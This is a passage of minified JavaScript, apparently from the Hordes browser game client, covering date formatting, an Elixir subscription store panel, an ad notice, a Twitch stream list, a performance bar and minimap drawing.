                    return s ? i : i.endOf(N_.D)
                }
                , a = (t, e) => {
                    const i = [0, 0, 0, 0]
                        , n = [23, 59, 59, 999];
                    return Q_.w(this.toDate()[t].apply(this.toDate(), (s ? i : n).slice(e)), this)
                }
                , { $W: r, $M: o, $D: l } = this
                , c = "set" + (this.$u ? "UTC" : "");
            switch (i) {
                case N_.Y:
                    return s ? n(1, 0) : n(31, 11);
                case N_.M:
                    return s ? n(1, o) : n(0, o + 1);
                case N_.W:
                    {
                        const t = this.$locale().weekStart || 0
                            , e = (r < t ? r + 7 : r) - t;
                        return n(s ? l - e : l + (6 - e), o)
                    }
                case N_.D:
                case N_.DATE:
                    return a(c + "Hours", 0);
                case N_.H:
                    return a(c + "Minutes", 1);
                case N_.MIN:
                    return a(c + "Seconds", 2);
                case N_.S:
                    return a(c + "Milliseconds", 3);
                default:
                    return this.clone()
            }
        }
        endOf(t) {
            return this.startOf(t, !1)
        }
        $set(t, e) {
            const s = Q_.p(t)
                , i = "set" + (this.$u ? "UTC" : "")
                , n = {
                    [N_.D]: i + "Date",
                    [N_.DATE]: i + "Date",
                    [N_.M]: i + "Month",
                    [N_.Y]: i + "FullYear",
                    [N_.H]: i + "Hours",
                    [N_.MIN]: i + "Minutes",
                    [N_.S]: i + "Seconds",
                    [N_.MS]: i + "Milliseconds"
                }[s]
                , a = s === N_.D ? this.$D + (e - this.$W) : e;
            if (s === N_.M || s === N_.Y) {
                const t = this.clone().set(N_.DATE, 1);
                t.$d[n](a),
                    t.init(),
                    this.$d = t.set(N_.DATE, Math.min(this.$D, t.daysInMonth())).toDate()
            } else
                n && this.$d[n](a);
            return this.init(),
                this
        }
        set(t, e) {
            return this.clone().$set(t, e)
        }
        get(t) {
            return this[Q_.p(t)]()
        }
        add(t, e) {
            t = Number(t);
            const s = Q_.p(e)
                , i = e => {
                    const s = V_(this);
                    return Q_.w(s.date(s.date() + Math.round(e * t)), this)
                }
                ;
            if (s === N_.M)
                return this.set(N_.M, this.$M + t);
            if (s === N_.Y)
                return this.set(N_.Y, this.$y + t);
            if (s === N_.D)
                return i(1);
            if (s === N_.W)
                return i(7);
            const n = {
                [N_.MIN]: N_.MILLISECONDS_A_MINUTE,
                [N_.H]: N_.MILLISECONDS_A_HOUR,
                [N_.S]: N_.MILLISECONDS_A_SECOND
            }[s] || 1
                , a = this.$d.getTime() + t * n;
            return Q_.w(a, this)
        }
        subtract(t, e) {
            return this.add(-1 * t, e)
        }
        format(t) {
            if (!this.isValid())
                return N_.INVALID_DATE_STRING;
            const e = t || N_.FORMAT_DEFAULT
                , s = Q_.z(this)
                , i = this.$locale()
                , { $H: n, $m: a, $M: r } = this
                , { weekdays: o, months: l, meridiem: c } = i
                , h = (t, s, i, n) => t && (t[s] || t(this, e)) || i[s].substr(0, n)
                , d = t => Q_.s(n % 12 || 12, t, "0")
                , u = c || ((t, e, s) => {
                    const i = t < 12 ? "AM" : "PM";
                    return s ? i.toLowerCase() : i
                }
                )
                , m = {
                    YY: String(this.$y).slice(-2),
                    YYYY: this.$y,
                    M: r + 1,
                    MM: Q_.s(r + 1, 2, "0"),
                    MMM: h(i.monthsShort, r, l, 3),
                    MMMM: l[r] || l(this, e),
                    D: this.$D,
                    DD: Q_.s(this.$D, 2, "0"),
                    d: String(this.$W),
                    dd: h(i.weekdaysMin, this.$W, o, 2),
                    ddd: h(i.weekdaysShort, this.$W, o, 3),
                    dddd: o[this.$W],
                    H: String(n),
                    HH: Q_.s(n, 2, "0"),
                    h: d(1),
                    hh: d(2),
                    a: u(n, a, !0),
                    A: u(n, a, !1),
                    m: String(a),
                    mm: Q_.s(a, 2, "0"),
                    s: String(this.$s),
                    ss: Q_.s(this.$s, 2, "0"),
                    SSS: Q_.s(this.$ms, 3, "0"),
                    Z: s
                };
            return e.replace(N_.REGEX_FORMAT, (t, e) => e || m[t] || s.replace(":", ""))
        }
        utcOffset() {
            return 15 * -Math.round(this.$d.getTimezoneOffset() / 15)
        }
        diff(t, e, s) {
            const i = Q_.p(e)
                , n = V_(t)
                , a = (n.utcOffset() - this.utcOffset()) * N_.MILLISECONDS_A_MINUTE
                , r = this - n;
            let o = Q_.m(this, n);
            return o = {
                [N_.Y]: o / 12,
                [N_.M]: o,
                [N_.Q]: o / 3,
                [N_.W]: (r - a) / N_.MILLISECONDS_A_WEEK,
                [N_.D]: (r - a) / N_.MILLISECONDS_A_DAY,
                [N_.H]: r / N_.MILLISECONDS_A_HOUR,
                [N_.MIN]: r / N_.MILLISECONDS_A_MINUTE,
                [N_.S]: r / N_.MILLISECONDS_A_SECOND
            }[i] || r,
                s ? o : Q_.a(o)
        }
        daysInMonth() {
            return this.endOf(N_.M).$D
        }
        $locale() {
            return K_[this.$L]
        }
        locale(t, e) {
            if (!t)
                return this.$L;
            const s = this.clone();
            return s.$L = Y_(t, e, !0),
                s
        }
        clone() {
            return Q_.w(this.$d, this)
        }
        toDate() {
            return new Date(this.valueOf())
        }
        toJSON() {
            return this.isValid() ? this.toISOString() : null
        }
        toISOString() {
            return this.$d.toISOString()
        }
        toString() {
            return this.$d.toUTCString()
        }
    }
    function eC(t, e, s) {
        const i = t.slice();
        return i[13] = e[s],
            i[15] = s,
            i
    }
    function sC(t) {
        let e;
        return {
            c() {
                e = P("Not active")
            },
            m(t, s) {
                M(t, e, s)
            },
            p: i,
            d(t) {
                t && _(e)
            }
        }
    }
    function iC(t) {
        let e, s, i, n, a = V_(t[1].subscribed_until).format("MMM DD, YYYY HH:mm") + "";
        return {
            c() {
                e = T("img"),
                    i = I(),
                    n = P(a),
                    B(e, "class", "svgicon"),
                    e.src !== (s = "/assets/ui/icons/check.svg?v=4002247") && B(e, "src", s)
            },
            m(t, s) {
                M(t, e, s),
                    M(t, i, s),
                    M(t, n, s)
            },
            p(t, e) {
                2 & e && a !== (a = V_(t[1].subscribed_until).format("MMM DD, YYYY HH:mm") + "") && F(n, a)
            },
            d(t) {
                t && _(e),
                    t && _(i),
                    t && _(n)
            }
        }
    }
    function nC(t) {
        let e, s, i, n, a, r, o = t[13].name + "";
        const l = new hk({
            props: {
                amount: t[13].price
            }
        });
        function c(...e) {
            return t[9](t[15], ...e)
        }
        return {
            c() {
                e = T("btn"),
                    s = P(o),
                    i = I(),
                    Ft(l.$$.fragment),
                    B(e, "class", n = "btn black navbtn " + (t[5] == t[15] ? "active" : "") + " big")
            },
            m(t, n, o) {
                M(t, e, n),
                    E(e, s),
                    E(e, i),
                    Zt(l, e, null),
                    a = !0,
                    o && r(),
                    r = A(e, "click", c)
            },
            p(s, i) {
                t = s,
                    (!a || 32 & i && n !== (n = "btn black navbtn " + (t[5] == t[15] ? "active" : "") + " big")) && B(e, "class", n)
            },
            i(t) {
                a || (Et(l.$$.fragment, t),
                    a = !0)
            },
            o(t) {
                Mt(l.$$.fragment, t),
                    a = !1
            },
            d(t) {
                t && _(e),
                    Ut(l),
                    r()
            }
        }
    }
    function aC(t) {
        let e;
        return {
            c() {
                e = T("div"),
                    e.innerHTML = '<p class="fadeIn textsub">Elixir time added. Thank you for your support. Please re-log any active characters.</p>',
                    B(e, "class", "fadeIn card marg-top")
            },
            m(t, s) {
                M(t, e, s)
            },
            p: i,
            i: i,
            o: i,
            d(t) {
                t && _(e)
            }
        }
    }
    function rC(t) {
        let e, s, i, n, a, r, o, l, c, h, d, u, m, p, f, g, v, y, b, w, x, k = t[6] ? "Gift" : "Add", $ = t[8].description + "", S = t[6] ? "someone" : "your account", C = t[6] ? "Send Elixir Gift" : t[1].subscribed_until ? "Extend Elixir" : "Activate Elixir";
        const R = new hk({
            props: {
                amount: t[8].price
            }
        })
            , z = [lC, oC]
            , Z = [];
        function L(t, e) {
            return t[6] ? 1 : 0
        }
        m = L(t),
            p = Z[m] = z[m](t);
        let N = "addsubscription" == t[0] && t[2] && cC(t)
            , O = t[1].storepoints < t[8].price && hC();
        return {
            c() {
                e = T("div"),
                    s = T("div"),
                    i = P(k),
                    n = I(),
                    a = T("span"),
                    r = P($),
                    o = P(" of "),
                    l = T("span"),
                    l.textContent = "Elixir",
                    c = P(" to "),
                    h = P(S),
                    d = P(" for "),
                    Ft(R.$$.fragment),
                    u = P("."),
                    p.c(),
                    f = D(),
                    N && N.c(),
                    g = T("div"),
                    v = T("div"),
                    y = P(C),
                    O && O.c(),
                    B(a, "class", "bold textwhite"),
                    B(l, "class", "textsub"),
                    B(s, "class", "textgrey"),
                    B(v, "class", b = "btn grey formatted " + ("addsubscription" == t[3] || t[1].storepoints < t[8].price ? "disabled" : "")),
                    B(g, "class", "subnav"),
                    B(e, "class", "fadeIn card marg-top"),
                    U(e, "padding", "18px")
            },
            m(p, b, k) {
                M(p, e, b),
                    E(e, s),
                    E(s, i),
                    E(s, n),
                    E(s, a),
                    E(a, r),
                    E(s, o),
                    E(s, l),
                    E(s, c),
                    E(s, h),
                    E(s, d),
                    Zt(R, s, null),
                    E(s, u),
                    Z[m].m(e, null),
                    E(e, f),
                    N && N.m(e, null),
                    E(e, g),
                    E(g, v),
                    E(v, y),
                    O && O.m(e, null),
                    w = !0,
                    k && x(),
                    x = A(v, "click", t[12])
            },
            p(t, s) {
                (!w || 64 & s) && k !== (k = t[6] ? "Gift" : "Add") && F(i, k),
                    (!w || 256 & s) && $ !== ($ = t[8].description + "") && F(r, $),
                    (!w || 64 & s) && S !== (S = t[6] ? "someone" : "your account") && F(h, S);
                const n = {};
                256 & s && (n.amount = t[8].price),
                    R.$set(n);
                let a = m;
                m = L(t),
                    m === a ? Z[m].p(t, s) : ($t(),
                        Mt(Z[a], 1, 1, () => {
                            Z[a] = null
                        }
                        ),
                        St(),
                        p = Z[m],
                        p || (p = Z[m] = z[m](t),
                            p.c()),
                        Et(p, 1),
                        p.m(e, f)),
                    "addsubscription" == t[0] && t[2] ? N ? N.p(t, s) : (N = cC(t),
                        N.c(),
                        N.m(e, g)) : N && (N.d(1),
                            N = null),
                    (!w || 66 & s) && C !== (C = t[6] ? "Send Elixir Gift" : t[1].subscribed_until ? "Extend Elixir" : "Activate Elixir") && F(y, C),
                    (!w || 266 & s && b !== (b = "btn grey formatted " + ("addsubscription" == t[3] || t[1].storepoints < t[8].price ? "disabled" : ""))) && B(v, "class", b),
                    t[1].storepoints < t[8].price ? O || (O = hC(),
                        O.c(),
                        O.m(e, null)) : O && (O.d(1),
                            O = null)
            },
            i(t) {
                w || (Et(R.$$.fragment, t),
                    Et(p),
                    w = !0)
            },
            o(t) {
                Mt(R.$$.fragment, t),
                    Mt(p),
                    w = !1
            },
            d(t) {
                t && _(e),
                    Ut(R),
                    Z[m].d(),
                    N && N.d(),
                    O && O.d(),
                    x()
            }
        }
    }
    function oC(t) {
        let e, s, i;
        function n(e) {
            t[11].call(null, e)
        }
        let a = {};
        void 0 !== t[7] && (a.name = t[7]);
        const r = new WM({
            props: a
        });
        return at.push(() => zt(r, "name", n)),
        {
            c() {
                e = T("div"),
                    Ft(r.$$.fragment),
                    B(e, "class", "subnav")
            },
            m(t, s) {
                M(t, e, s),
                    Zt(r, e, null),
                    i = !0
            },
            p(t, e) {
                const i = {};
                !s && 128 & e && (s = !0,
                    i.name = t[7],
                    mt(() => s = !1)),
                    r.$set(i)
            },
            i(t) {
                i || (Et(r.$$.fragment, t),
                    i = !0)
            },
            o(t) {
                Mt(r.$$.fragment, t),
                    i = !1
            },
            d(t) {
                t && _(e),
                    Ut(r)
            }
        }
    }
    function lC(t) {
        let e, s, n, a, r, o = V_(t[1].subscribed_until || void 0).add(t[8].days, "day").format("MMM DD, YYYY HH:mm") + "";
        return {
            c() {
                e = T("p"),
                    s = P("Enables Elixir until "),
                    n = T("span"),
                    a = P(o),
                    r = P("."),
                    B(n, "class", "textwhite"),
                    B(e, "class", "bold textsub")
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s),
                    E(e, n),
                    E(n, a),
                    E(e, r)
            },
            p(t, e) {
                258 & e && o !== (o = V_(t[1].subscribed_until || void 0).add(t[8].days, "day").format("MMM DD, YYYY HH:mm") + "") && F(a, o)
            },
            i: i,
            o: i,
            d(t) {
                t && _(e)
            }
        }
    }
    function cC(t) {
        let e, s;
        return {
            c() {
                e = T("p"),
                    s = P(t[2]),
                    B(e, "class", "fadeIn textred")
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s)
            },
            p(t, e) {
                4 & e && F(s, t[2])
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function hC(t) {
        let e;
        return {
            c() {
                e = T("p"),
                    e.innerHTML = '<small>You do not have enough Hordes Points to do this. <a class="textprimary" href="/store">Buy Hordes Points</a></small>'
            },
            m(t, s) {
                M(t, e, s)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function dC(t) {
        let e, s, i, n, a, r, o, l, c, h, d, u, m, p, f, g, v;
        const y = new L_({});
        function b(t, e) {
            return t[1].subscribed_until ? iC : sC
        }
        let w = b(t)
            , x = w(t);
        const k = new hk({
            props: {
                amount: t[1].storepoints
            }
        });
        let$ = KS
            , S = [];
        for (let e = 0; e < $.length; e += 1)
            S[e] = nC(eC(t, $, e));
        const D = t => Mt(S[t], 1, 1, () => {
            S[t] = null
        }
        )
            , R = [rC, aC]
            , z = [];
        function F(t, e) {
            return void 0 !== t[5] ? 0 : "addsubscription" == t[0] ? 1 : -1
        }
        return ~(p = F(t)) && (f = z[p] = R[p](t)),
        {
            c() {
                e = T("div"),
                    Ft(y.$$.fragment),
                    s = T("small"),
                    s.textContent = "Elixir",
                    i = T("div"),
                    x.c(),
                    a = T("small"),
                    a.textContent = "Hordes Points",
                    r = T("div"),
                    Ft(k.$$.fragment),
                    o = I(),
                    l = T("a"),
                    l.textContent = "(Buy Hordes Points)",
                    c = T("p"),
                    c.textContent = "Support Hordes development for a low cost. Unlock additional bag slots, store more items in your stash, make use of enhanced merchant features and many more perks (TBA).",
                    h = T("div");
                for (let t = 0; t < S.length; t += 1)
                    S[t].c();
                d = T("btn"),
                    u = P("Send Gift"),
                    f && f.c(),
                    B(s, "class", "textgrey"),
                    B(i, "class", n = "cardinfo " + (t[1].subscribed_until ? "textsub" : "textgrey")),
                    B(a, "class", "textgrey"),
                    B(l, "class", "textwhite"),
                    B(l, "href", "/store"),
                    B(r, "class", "cardinfo"),
                    B(c, "class", "textgrey"),
                    B(d, "class", m = "btn navbtn " + (t[6] ? "active white" : "") + " big"),
                    B(h, "class", "subnav"),
                    B(e, "class", "card")
            },
            m(n, m, f) {
                M(n, e, m),
                    Zt(y, e, null),
                    E(e, s),
                    E(e, i),
                    x.m(i, null),
                    E(e, a),
                    E(e, r),
                    Zt(k, r, null),
                    E(r, o),
                    E(r, l),
                    E(e, c),
                    E(e, h);
                for (let t = 0; t < S.length; t += 1)
                    S[t].m(h, null);
                E(h, d),
                    E(d, u),
                    ~p && z[p].m(e, null),
                    g = !0,
                    f && v(),
                    v = A(d, "click", t[10])
            },
            p(t, [s]) {
                w === (w = b(t)) && x ? x.p(t, s) : (x.d(1),
                    x = w(t),
                    x && (x.c(),
                        x.m(i, null))),
                    (!g || 2 & s && n !== (n = "cardinfo " + (t[1].subscribed_until ? "textsub" : "textgrey"))) && B(i, "class", n);
                const a = {};
                if (2 & s && (a.amount = t[1].storepoints),
                    k.$set(a),
                    32 & s) {
                    let e;
                    for ($ = KS,
                        e = 0; e < $.length; e += 1) {
                        const i = eC(t, $, e);
                        S[e] ? (S[e].p(i, s),
                            Et(S[e], 1)) : (S[e] = nC(i),
                                S[e].c(),
                                Et(S[e], 1),
                                S[e].m(h, d))
                    }
                    for ($t(),
                        e = $.length; e < S.length; e += 1)
                        D(e);
                    St()
                }
                (!g || 64 & s && m !== (m = "btn navbtn " + (t[6] ? "active white" : "") + " big")) && B(d, "class", m);
                let r = p;
                p = F(t),
                    p === r ? ~p && z[p].p(t, s) : (f && ($t(),
                        Mt(z[r], 1, 1, () => {
                            z[r] = null
                        }
                        ),
                        St()),
                        ~p ? (f = z[p],
                            f || (f = z[p] = R[p](t),
                                f.c()),
                            Et(f, 1),
                            f.m(e, null)) : f = null)
            },
            i(t) {
                if (!g) {
                    Et(y.$$.fragment, t),
                        Et(k.$$.fragment, t);
                    for (let t = 0; t < $.length; t += 1)
                        Et(S[t]);
                    Et(f),
                        g = !0
                }
            },
            o(t) {
                Mt(y.$$.fragment, t),
                    Mt(k.$$.fragment, t),
                    S = S.filter(Boolean);
                for (let t = 0; t < S.length; t += 1)
                    Mt(S[t]);
                Mt(f),
                    g = !1
            },
            d(t) {
                t && _(e),
                    Ut(y),
                    x.d(),
                    Ut(k),
                    C(S, t),
                    ~p && z[p].d(),
                    v()
            }
        }
    }
    function uC(t, e, s) {
        let i, n, a = !1, { user: r } = e, { flash: o } = e, { flashmsg: l } = e, { action: c } = e, { apiCall: h } = e;
        const d = (t, e) => s(5, i = t)
            , u = t => s(6, a = !a);
        function m(t) {
            n = t,
                s(7, n)
        }
        const p = t => h("addsubscription", "/api/account/addsubscription", {
            value: i,
            gift: a ? n : void 0
        }, !0, t => {
            "ok" == t.result && (s(5, i = void 0),
                s(0, o = "addsubscription"))
        }
        );
        let f;
        return t.$set = t => {
            "user" in t && s(1, r = t.user),
                "flash" in t && s(0, o = t.flash),
                "flashmsg" in t && s(2, l = t.flashmsg),
                "action" in t && s(3, c = t.action),
                "apiCall" in t && s(4, h = t.apiCall)
        }
            ,
            t.$$.update = () => {
                32 & t.$$.dirty && s(8, f = KS[i])
            }
            ,
            [o, r, l, c, h, i, a, n, f, d, u, m, p]
    }
    V_.prototype = tC.prototype,
        V_.extend = (t, e) => (t(e, tC, V_),
            V_),
        V_.locale = Y_,
        V_.isDayjs = W_,
        V_.unix = t => V_(1e3 * t),
        V_.en = K_[H_],
        V_.Ls = K_;
    class mC extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, uC, dC, h, {
                    user: 1,
                    flash: 0,
                    flashmsg: 2,
                    action: 3,
                    apiCall: 4
                })
        }
    }
    function pC(t) {
        let e, s, i;
        const n = new Sb({
            props: {
                title: "Store / Elixir",
                icon: "gem",
                $$slots: {
                    default: [gC]
                },
                $$scope: {
                    ctx: t
                }
            }
        });
        return n.$on("close", t[7]),
        {
            c() {
                e = T("div"),
                    s = T("div"),
                    Ft(n.$$.fragment),
                    B(s, "class", "uiscaled"),
                    B(e, "class", "absCentered container svelte-1fl1zyr")
            },
            m(t, a) {
                M(t, e, a),
                    E(e, s),
                    Zt(n, s, null),
                    i = !0
            },
            p(t, e) {
                const s = {};
                302 & e && (s.$$scope = {
                    dirty: e,
                    ctx: t
                }),
                    n.$set(s)
            },
            i(t) {
                i || (Et(n.$$.fragment, t),
                    i = !0)
            },
            o(t) {
                Mt(n.$$.fragment, t),
                    i = !1
            },
            d(t) {
                t && _(e),
                    Ut(n)
            }
        }
    }
    function fC(t) {
        let e;
        const s = new mC({
            props: {
                user: t[5],
                flash: t[1],
                flashmsg: t[2],
                action: t[3],
                apiCall: t[0]
            }
        });
        return {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            p(t, e) {
                const i = {};
                32 & e && (i.user = t[5]),
                    2 & e && (i.flash = t[1]),
                    4 & e && (i.flashmsg = t[2]),
                    8 & e && (i.action = t[3]),
                    s.$set(i)
            },
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function gC(t) {
        let e, s, i = t[5] && fC(t);
        return {
            c() {
                i && i.c(),
                    e = D()
            },
            m(t, n) {
                i && i.m(t, n),
                    M(t, e, n),
                    s = !0
            },
            p(t, s) {
                t[5] ? i ? (i.p(t, s),
                    32 & s && Et(i, 1)) : (i = fC(t),
                        i.c(),
                        Et(i, 1),
                        i.m(e.parentNode, e)) : i && ($t(),
                            Mt(i, 1, 1, () => {
                                i = null
                            }
                            ),
                            St())
            },
            i(t) {
                s || (Et(i),
                    s = !0)
            },
            o(t) {
                Mt(i),
                    s = !1
            },
            d(t) {
                i && i.d(t),
                    t && _(e)
            }
        }
    }
    function vC(t) {
        let e, s, i = t[4] && pC(t);
        return {
            c() {
                i && i.c(),
                    e = D()
            },
            m(t, n) {
                i && i.m(t, n),
                    M(t, e, n),
                    s = !0
            },
            p(t, [s]) {
                t[4] ? i ? (i.p(t, s),
                    16 & s && Et(i, 1)) : (i = pC(t),
                        i.c(),
                        Et(i, 1),
                        i.m(e.parentNode, e)) : i && ($t(),
                            Mt(i, 1, 1, () => {
                                i = null
                            }
                            ),
                            St())
            },
            i(t) {
                s || (Et(i),
                    s = !0)
            },
            o(t) {
                Mt(i),
                    s = !1
            },
            d(t) {
                i && i.d(t),
                    t && _(e)
            }
        }
    }
    function yC(t, e, s) {
        let i, n, a;
        m(t, us, t => s(4, i = t)),
            m(t, F_, t => s(5, n = t));
        let r = void 0
            , o = void 0
            , l = void 0;
        const c = async (t, e, i, n, a) => {
            s(3, l = t);
            const c = await ZM(e, i);
            s(3, l = void 0),
                "ok" === c.result ? s(1, r = void 0) : (s(1, r = t),
                    s(2, o = c.result)),
                n && Z_(),
                a && a(c)
        }
            , h = t => y(us, i = !1);
        return t.$$.update = () => {
            16 & t.$$.dirty && i && Z_()
        }
            ,
            [c, r, o, l, i, n, a, h]
    }
    class bC extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, yC, vC, h, {
                    apiCall: 0
                })
        }
        get apiCall() {
            return this.$$.ctx[0]
        }
    }
    function wC(t) {
        let e, s, n, a, r, o, l, c;
        return {
            c() {
                e = T("div"),
                    s = T("h3"),
                    n = P("Using AdBlock? Buy "),
                    a = T("span"),
                    a.innerHTML = '<span class="textwhite">Hordes</span>  <img class="svgicon texticon" src="/assets/ui/icons/gem.svg?v=4002247">  Elixir',
                    r = P(" to hide this window and support development."),
                    o = T("ins"),
                    l = T("script"),
                    l.textContent = "(adsbygoogle = window.adsbygoogle || []).push({});",
                    B(a, "class", "btn textsub"),
                    B(s, "class", "textgrey blocktext svelte-svpjti"),
                    B(o, "class", "adsbygoogle"),
                    U(o, "display", "inline-block"),
                    U(o, "width", "728px"),
                    U(o, "height", "90px"),
                    B(o, "data-ad-client", "ca-pub-6128207871826113"),
                    B(o, "data-ad-slot", "2385450998"),
                    B(e, "class", "container panel-black svelte-svpjti")
            },
            m(i, h, d) {
                M(i, e, h),
                    E(e, s),
                    E(s, n),
                    E(s, a),
                    E(s, r),
                    E(e, o),
                    E(e, l),
                    d && c(),
                    c = A(a, "click", t[1])
            },
            p: i,
            i: i,
            o: i,
            d(t) {
                t && _(e),
                    c()
            }
        }
    }
    function xC(t, e, s) {
        let i;
        m(t, us, t => s(0, i = t));
        const n = t => y(us, i = !0);
        return [i, n]
    }
    class kC extends Ot {
        constructor(t) {
            super();
            //Nt(this, t, xC, wC, h, {})
        }
    }
    function $C(t, e, s) {
        const i = t.slice();
        return i[4] = e[s],
            i
    }
    function SC(t) {
        let e, s, i, n, a, r = Mb(t[4].viewers) + "", o = Mb(t[4].followers) + "";
        return {
            c() {
                e = T("div"),
                    s = T("span"),
                    i = P(r),
                    n = I(),
                    a = P(o),
                    B(s, "class", "textgreen"),
                    B(e, "class", "bold viewcount textbox svelte-13wcf6i")
            },
            m(t, r) {
                M(t, e, r),
                    E(e, s),
                    E(s, i),
                    E(e, n),
                    E(e, a)
            },
            p(t, e) {
                2 & e && r !== (r = Mb(t[4].viewers) + "") && F(i, r),
                    2 & e && o !== (o = Mb(t[4].followers) + "") && F(a, o)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function EC(t) {
        let e, s, i, n, a, r, o, l = t[4].name + "", c = (t[4].viewers || t[4].followers) && SC(t);
        return {
            c() {
                e = T("a"),
                    s = T("div"),
                    c && c.c(),
                    i = T("div"),
                    n = P(l),
                    B(i, "class", "name textbox svelte-13wcf6i"),
                    B(s, "class", "border black preview svelte-13wcf6i"),
                    B(s, "style", a = "background-image:url(" + (t[4].preview || "") + "); " + (t[0] ? "margin-top:2px;" : "")),
                    B(e, "class", "fadeIn stream svelte-13wcf6i"),
                    B(e, "target", "_blank"),
                    B(e, "rel", "noopener noreferrer"),
                    B(e, "href", r = t[4].url),
                    B(e, "style", o = t[0] ? "" : "width:calc(100%/6);")
            },
            m(t, a) {
                M(t, e, a),
                    E(e, s),
                    c && c.m(s, null),
                    E(s, i),
                    E(i, n)
            },
            p(t, h) {
                t[4].viewers || t[4].followers ? c ? c.p(t, h) : (c = SC(t),
                    c.c(),
                    c.m(s, i)) : c && (c.d(1),
                        c = null),
                    2 & h && l !== (l = t[4].name + "") && F(n, l),
                    3 & h && a !== (a = "background-image:url(" + (t[4].preview || "") + "); " + (t[0] ? "margin-top:2px;" : "")) && B(s, "style", a),
                    2 & h && r !== (r = t[4].url) && B(e, "href", r),
                    1 & h && o !== (o = t[0] ? "" : "width:calc(100%/6);") && B(e, "style", o)
            },
            d(t) {
                t && _(e),
                    c && c.d()
            }
        }
    }
    function MC(t) {
        let e, s, n = t[1], a = [];
        for (let e = 0; e < n.length; e += 1)
            a[e] = EC($C(t, n, e));
        return {
            c() {
                e = T("div");
                for (let t = 0; t < a.length; t += 1)
                    a[t].c();
                B(e, "style", s = "pointer-events: all; " + (t[0] ? "float:right; clear:right; width:150px;" : "display: flex; justify-content: center;"))
            },
            m(t, s) {
                M(t, e, s);
                for (let t = 0; t < a.length; t += 1)
                    a[t].m(e, null)
            },
            p(t, [i]) {
                if (3 & i) {
                    let s;
                    for (n = t[1],
                        s = 0; s < n.length; s += 1) {
                        const r = $C(t, n, s);
                        a[s] ? a[s].p(r, i) : (a[s] = EC(r),
                            a[s].c(),
                            a[s].m(e, null))
                    }
                    for (; s < a.length; s += 1)
                        a[s].d(1);
                    a.length = n.length
                }
                1 & i && s !== (s = "pointer-events: all; " + (t[0] ? "float:right; clear:right; width:150px;" : "display: flex; justify-content: center;")) && B(e, "style", s)
            },
            i: i,
            o: i,
            d(t) {
                t && _(e),
                    C(a, t)
            }
        }
    }
    function _C(t, e, s) {
        let i, { vertical: n = !1 } = e, a = [];
        n && a.push({
            name: "Loading streams..."
        });
        const r = async () => {
            i = setTimeout(r, 1e4),
                s(1, a = await ZM("/api/twitch/streams", {
                    max: 6
                })),
                n && 0 === a.length && a.push({
                    name: "No streams, refreshing..."
                })
        }
            ;
        return J(r),
            et(t => {
                i && clearTimeout(i)
            }
            ),
            t.$set = t => {
                "vertical" in t && s(0, n = t.vertical)
            }
            ,
            [n, a]
    }
    class CC extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, _C, MC, h, {
                    vertical: 0
                })
        }
    }
    function TC(t) {
        let e, s, i, n, a, r, o, l, c, h, d = t[1][1] + "", u = t[1][0] + "", m = t[1][2] + "";
        return {
            c() {
                e = T("small"),
                    s = T("div"),
                    i = P(d),
                    n = P(" fps"),
                    a = T("div"),
                    r = P(u),
                    o = P(" ms"),
                    l = T("div"),
                    c = P(m),
                    h = P(" KBs"),
                    B(s, "class", "textgreen"),
                    B(a, "class", "textcyan"),
                    B(l, "class", "textorange"),
                    B(e, "class", "marg-top bar btn black grey svelte-1apx3f3")
            },
            m(t, d) {
                M(t, e, d),
                    E(e, s),
                    E(s, i),
                    E(s, n),
                    E(e, a),
                    E(a, r),
                    E(a, o),
                    E(e, l),
                    E(l, c),
                    E(l, h)
            },
            p(t, e) {
                2 & e && d !== (d = t[1][1] + "") && F(i, d),
                    2 & e && u !== (u = t[1][0] + "") && F(r, u),
                    2 & e && m !== (m = t[1][2] + "") && F(c, m)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function PC(t) {
        let e, s = t[0] && TC(t);
        return {
            c() {
                s && s.c(),
                    e = D()
            },
            m(t, i) {
                s && s.m(t, i),
                    M(t, e, i)
            },
            p(t, [i]) {
                t[0] ? s ? s.p(t, i) : (s = TC(t),
                    s.c(),
                    s.m(e.parentNode, e)) : s && (s.d(1),
                        s = null)
            },
            i: i,
            o: i,
            d(t) {
                s && s.d(t),
                    t && _(e)
            }
        }
    }
    function IC(t, e, s) {
        let i, n;
        return m(t, Fs, t => s(0, i = t)),
            m(t, ke, t => s(1, n = t)),
            [i, n]
    }
    class DC extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, IC, PC, h, {})
        }
    }
    let AC = void 0;
    const BC = {}
        , RC = t => (void 0 === AC && (AC = getComputedStyle(document.body)),
            void 0 !== BC[t] ? BC[t] : BC[t] = AC.getPropertyValue("--" + t));
    let zC = !1
        , FC = !1;
    const ZC = document.createElement("canvas")
        , UC = ZC.getContext("2d")
        , LC = document.createElement("img");
    LC.onload = function () {
        FC = !0
    }
        ;
    const NC = {
        player: "#fff",
        monster: "#D53434",
        pvp: RC("pvp"),
        friendly: RC("health"),
        party: RC("party")
    }
        , OC = () => {
            $l.map.onPress(() => {
                jC(zC = !zC)
            }
            )
        }
        , jC = t => {
            const e = ZC.parentElement.parentElement.parentElement
                , s = Math.min(e.offsetWidth, e.offsetHeight);
            let i = Math.round(t ? .8 * s : Math.max(150, Math.min(200, .2 * s)));
            i % 2 != 0 && (i += 1),
                VC = (ZC.width = i) / 2,
                YC = (ZC.height = i) / 2,
                ZC.parentElement.style.height = ZC.parentElement.style.width = 2 * VC + "px"
        }
        ;
    let qC = 0;
    const XC = t => {
        qC++,
            !FC || !Ua.player || ji.mapLowQuality && qC % 10 != 0 || (zC ? (KC = WC = 0,
                UC.drawImage(LC, 0, 0, ZC.width, ZC.height)) : (KC = LC.width * Ua.player.Za[0] / Ua.bounds - VC,
                    WC = LC.height * Ua.player.Za[2] / Ua.bounds - YC,
                    UC.drawImage(LC, -Math.round(KC), -Math.round(WC))),
                Ua.entities.array.forEach(t => {
